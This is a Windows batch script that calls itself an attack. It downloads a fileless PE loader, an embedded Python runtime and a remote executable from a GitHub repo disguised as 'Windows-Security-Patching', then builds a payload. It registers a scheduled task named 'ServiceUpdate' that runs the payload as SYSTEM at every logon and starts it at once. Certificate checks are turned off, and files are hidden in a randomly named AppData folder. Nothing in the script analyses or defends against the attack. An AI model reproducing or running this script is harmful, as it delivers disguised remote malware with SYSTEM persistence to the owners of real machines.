@echo off
REM Run this script as local admin
REM Get path to %AppData%
set "AppDataPath=%AppData%"
REM Generate random string for filepath
setlocal enabledelayedexpansion
set "chars=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
set "randomString="
for /l %%i in (1,1,10) do (
    set /a "rand=!random! %% 62"
    for /f %%j in ('echo !rand!') do set "randomString=!randomString!!chars:~%%j,1!"
)
echo Random String: %randomString%
set "FolderName=%randomString%"
echo Generated random string: %FolderName%
REM echo The AppData path is: %AppDataPath%
IF EXIST "C:\Program Files\Microsoft Deployment Toolkit\Templates\Distribution\Tools\x64\ServiceUI.exe" (
    ECHO The ServiceUI.exe file exists.
    echo Proceeding with the attack.
) ELSE (
    ECHO The ServiceUI.exe file does not exist.
    echo Downloading and Installing now...
    C:\Windows\System32\curl.exe --insecure -s -S -g -L -o %AppDataPath%\MicrosoftDeploymentToolkit_x64.msi https://download.microsoft.com/download/3/3/9/339be62d-b4b8-4956-b58d-73c4685fc492/MicrosoftDeploymentToolkit_x64.msi
    REM Silent install
    msiexec /i "%AppDataPath%\MicrosoftDeploymentToolkit_x64.msi" /qn /norestart /L*V "C:\Temp\msilog.log"
    ECHO The ServiceUI.exe installed.
    echo Proceeding with the attack.
)
echo Downloading Unzip.exe now...
C:\Windows\System32\curl.exe --insecure -s -S -g -L -o %AppDataPath%\unzip.exe https://github.com/xxoo-d/Windows-Security-Patching/raw/refs/heads/main/unzip.exe
REM Download the Fileless-PE loader repo to %AppData%
C:\Windows\System32\curl.exe --insecure -s -S -g -L -o %AppDataPath%\main.zip https://github.com/malwarekid/Fileless-PE/archive/refs/heads/main.zip
%AppDataPath%\unzip.exe -d %AppDataPath%\%FolderName% %AppDataPath%\main.zip
REM Download Python for Windows to random folder created in %AppData%
C:\Windows\System32\curl.exe --insecure -s -S -g -L -o %AppDataPath%\python-3.14.0-embed-amd64.zip https://www.python.org/ftp/python/3.14.0/python-3.14.0-embed-amd64.zip
%AppDataPath%\unzip.exe -d %AppDataPath%\%FolderName%\Fileless-PE-main %AppDataPath%\python-3.14.0-embed-amd64.zip
REM Generate payload
(echo https://github.com/xxoo-d/Windows-Security-Patching/raw/refs/heads/main/wssrvc.exe && echo exe && echo %AppDataPath%\%FolderName%\Fileless-PE-main\wssrvc.py) | %AppDataPath%\%FolderName%\Fileless-PE-main\python.exe %AppDataPath%\%FolderName%\Fileless-PE-main\Fileless-PE.py
REM Create Scheduled task and execute
schtasks /create /tn ServiceUpdate /tr "'C:\Program Files\Microsoft Deployment Toolkit\Templates\Distribution\Tools\x64\ServiceUI.exe' %AppDataPath%\%FolderName%\Fileless-PE-main\pythonw.exe %AppDataPath%\%FolderName%\Fileless-PE-main\wssrvc.py" /sc onlogon /ru System
schtasks /run /tn ServiceUpdate